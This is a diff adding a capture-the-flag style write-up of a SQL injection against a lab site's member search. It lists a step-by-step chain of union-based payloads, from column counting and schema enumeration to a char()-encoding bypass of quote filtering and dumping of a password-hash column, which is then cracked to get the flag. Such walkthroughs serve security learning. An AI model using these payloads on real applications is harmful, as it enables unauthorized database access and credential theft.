@@ -1,0 +1,53 @@
+SQL Injection - Members:
+INFO:
+Columns: 2: First name, Surname
+Version: 5.5.44-0ubuntu0.12.04.1
+Table Names: users, guestbook, list_images, vote_dbs
+Ascii “users” - 117,115,101,114,115
+
+
+Steps & Commands:
+
+1 or 1=1
+Placing this into the members search input allows us to get a return of all of the members in the database. This shows us that there is one where the first name is “Flag” and the last name is “GetThe” telling us that there is a flag to be found. 
+Researching different sql injection techniques shows that a union attack would be beneficial for finding out everything we can about the DB.
+
+1 or 1=1 ORDER BY 2--
+Next we need to figure out how many columns are being returned. To do this we add order by to the input and we keep changing the number until we get an error. When it is 3 we have an error but not at 2 meaning that 2 columns are returned.
+This allows us to start searching for table names because we can start asking for specific information.
+
+1 or 1=1 UNION SELECT table_name, 2 FROM information_schema.tables-- -
+Shows us all of the table names in the DB
+We find the relevant table names we might want in the list which in this case are users, guestbook, list_images, and vote_dbs
+
+
+1 or 1=1 UNION SELECT column_name, 2 FROM information_schema.columns
+Shows us all of the columns in the DB but the problem is that it’s useless without specifying the table we want to look in but it does show us that a password column exists that we might find useful later.
+
+1 or 1=1 UNION SELECT column_name, 2 FROM information_schema.columns where table_name="users"-- -
+This is how you would find the columns in the table you are wanting but the problem is that a lot of searches like this are sanitized from allowing raw quotation marks with a php function called magic quotes. 
+We use an ascii converter to translate “users” to ascii
+
+1 or 1=1 UNION SELECT column_name, 2 FROM information_schema.columns where table_name=char(117,115,101,114,115)-- -
+Swapping the quoted string for this ascii version manages to avoid the magic quotes function and give us back the results we want for the user table.
+We see that we have columns user_id, first_name, last_name, town, country, planet, Commentaire, and countersign
+
+1 or 1=1 UNION SELECT Commentaire, 2 FROM users-- -
+We can now choose the column we want to select inside the table. Since this is combined with the 1 or 1=1 command it’s easy to see which member each commentaire belongs to.
+For the GetThe Flag member we see a commentaire of “Decrypt this password -> then lower all the char. Sh256 on it and it's good !” Obviously the next step will be to find that password column in relation to the GetThe Flag user
+
+1 or 1=1 UNION SELECT countersign, 2 FROM users-- -
+As there is no password field inside of the users table more trial and error shows that the countersign column is the one that holds the passwords.
+For the user GetThe Flag we see a hashed password of 5ff9d0165b4f92b14994e5c685cdce28
+Decrypted this md5 hash is FortyTwo
+We turn that to lower case fortytwo and run it through sha256 to get the flag of 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
+
+
+
+RESOURCES:
+http://www.sqlinjection.net/tutorial/
+https://portswigger.net/web-security/sql-injection/union-attacks
+Basic SQL Injection Guide #1 - Union SQL Injection GET Search
+Ascii Converter
+https://hashkiller.co.uk/Cracker/MD5
+https://passwordsgenerator.net/sha256-hash-generator/
